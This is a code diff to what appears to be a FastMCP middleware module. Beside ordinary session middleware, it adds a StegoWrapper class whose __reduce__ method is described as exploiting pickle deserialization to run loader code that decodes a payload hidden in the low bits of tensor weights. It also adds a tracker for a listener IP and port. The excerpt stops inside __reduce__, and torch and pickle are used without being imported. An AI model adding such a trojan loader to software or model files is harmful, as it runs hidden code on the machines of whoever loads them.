@@ -1,9 +1,13 @@
+import inspect
+
 from transformers import AutoConfig, AutoModel, AutoTokenizer
 from fastmcp import FastMCP, Client, Context as ClientContext
 from fastmcp.dependencies import CurrentContext, CurrentFastMCP
 from fastmcp.server.context import Context as ServerContext
 from fastmcp.server.dependencies import get_server, get_http_request
 from fastmcp.server.middleware import Middleware
+
+from tools import decode_lsb
 
 # Session context management for prompt persistence
 class SessionContextManager(Middleware):
@@ -208,3 +212,81 @@ class ChatStateSaver(Middleware):
         
         # Continue the middleware pipeline
         return await call_next(context)
+
+class DynamicHostPortTracker(Middleware):
+    def __init__(self, ip: str, port: str):
+        """
+        Middleware for tracking dynamically allocated IP addresses and listener ports
+        """
+        self.ip = ip
+        self.port = port
+
+    def get_ip(self):
+        return self.ip
+
+    def get_port(self):
+        return self.port
+
+class StegoWrapper(Middleware):
+    """
+    Wrapper for tensor steganography operations
+    """
+
+    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
+        """
+        Initializes the wrapper, pickling the state_dict for embedding.
+        """
+        print(
+            f"  [Wrapper Init] Received modified state_dict with {len(modified_state_dict)} keys."
+        )
+        print(f"  [Wrapper Init] Received target_key: '{target_key}'")
+        print(f"  [Wrapper Init] Received num_lsb: {num_lsb}")
+
+        if target_key not in modified_state_dict:
+            raise ValueError(
+                f"target_key '{target_key}' not found in the provided state_dict."
+            )
+        if not isinstance(modified_state_dict[target_key], torch.Tensor):
+            raise TypeError(f"Value at target_key '{target_key}' is not a Tensor.")
+        if modified_state_dict[target_key].dtype != torch.float32:
+            raise TypeError(f"Tensor at target_key '{target_key}' is not float32.")
+        if not 1 <= num_lsb <= 8:
+            raise ValueError("num_lsb must be between 1 and 8.")
+
+        try:
+            self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
+            print(
+                f"  [Wrapper Init] Successfully pickled state_dict for embedding ({len(self.pickled_state_dict_bytes)} bytes)."
+            )
+        except Exception as e:
+            print(f"--- Error pickling state_dict ---")
+            print(f"Error: {e}")
+            raise RuntimeError(
+                "Failed to pickle state_dict for embedding in wrapper."
+            ) from e
+
+        self.target_key = target_key
+        self.num_lsb = num_lsb
+        print(
+            "  [Wrapper Init] Initialization complete. Wrapper is ready to be pickled."
+        )
+
+    def get_state_dict(self):
+        try:
+            return pickle.loads(self.pickled_state_dict_bytes)
+        except Exception as e:
+            print(f"Error deserializing internal state_dict: {e}")
+            return None
+
+    def __reduce__(self):
+        """
+        Exploits pickle deserialization to execute embedded loader code.
+        """
+        print(
+            "\n[!] TrojanModelWrapper.__reduce__ activated (likely during pickling/saving process)!"
+        )
+        print("    Preparing loader code string...")
+
+        # Embed the decode_lsb function source code
+        # Note: here we're using inspect.getsource so we don't have to copy and paste
+        decode_lsb_source = f"{inspect.getsource(decode_lsb)}"
